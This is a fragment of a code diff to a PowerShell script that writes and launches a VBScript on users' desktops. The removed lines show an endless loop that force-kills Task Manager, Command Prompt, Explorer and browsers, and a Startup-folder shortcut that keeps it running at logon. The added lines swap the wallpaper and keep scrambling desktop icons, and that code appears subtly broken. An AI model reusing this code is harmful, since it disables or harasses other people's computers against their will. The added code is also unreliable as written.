@@ -47,41 +47,33 @@ foreach ($user in $users) {
 # Create VBScript file
 $vbsScript = @"
 Set objShell = CreateObject("WScript.Shell")
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+
+Set objShell = WScript.CreateObject("WScript.Shell")
+Set objShellApp = CreateObject("Shell.Application")
+Set objDesktop = objShellApp.Namespace(0)
+Set objFolder = objDesktop.Self
 
 Do While True
-    ' Play a beep sound
-    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
-
-    ' Close Task Manager
-    objShell.Run "taskkill /f /im taskmgr.exe", 0, True
-
-    ' Close Command Prompt
-    objShell.Run "taskkill /f /im cmd.exe", 0, True
-
-    ' Close File Explorer
-    objShell.Run "taskkill /f /im explorer.exe", 0, True
-
-    ' Close any browser
-    objShell.Run "taskkill /f /im chrome.exe", 0, True
-    objShell.Run "taskkill /f /im firefox.exe", 0, True
-    objShell.Run "taskkill /f /im iexplore.exe", 0, True
-
-    WScript.Sleep 0
+    For Each objItem In objFolder.Items
+        'get random x and y coordinates
+        Randomize
+        xPos = Int((Screen.Width - objItem.Width) * Rnd)
+        yPos = Int((Screen.Height - objItem.Height) * Rnd)
+        
+        'move the item to the random position
+        objShellApp.MoveItem objItem, xPos, yPos
+    Next
+    WScript.Sleep 1000 'wait for 1 second before moving items again
 Loop
 "@
 
 $vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
 $vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
 
-# Create a shortcut to the VBScript file in the startup folder
-$startupFolderPath = [Environment]::GetFolderPath("Startup")
-$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "script.lnk")
-$WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $vbsFilePath
-$shortcut.Save()
-
 # Run the VBScript file
+$WshShell = New-Object -ComObject WScript.Shell
 $WshShell.Run($vbsFilePath)
 
 $source = @"
